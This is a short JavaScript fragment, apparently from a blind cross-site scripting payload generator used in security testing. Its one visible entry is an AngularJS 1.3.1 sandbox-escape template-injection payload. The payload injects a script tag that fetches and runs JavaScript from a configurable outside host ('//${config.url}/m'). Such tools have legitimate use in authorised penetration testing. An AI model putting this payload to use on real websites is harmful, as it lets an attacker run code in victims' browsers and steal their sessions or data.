...
exports.generatePayloads = (config) => {
  const payloads = [
    ...
    { description: 'Gareth Heyes - 1.3.1 - AngularJS Payload', payload: `{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;'a'.constructor.prototype.charAt=''.valueOf; $eval('x=1;eval(\`var _=document\\\\x2ecreateElement(\\'script\\');_\\\\x2esrc=\\'//${config.url}/m\\';document\\\\x2ebody\\\\x2eappendChild(_);\`);//');}}`},
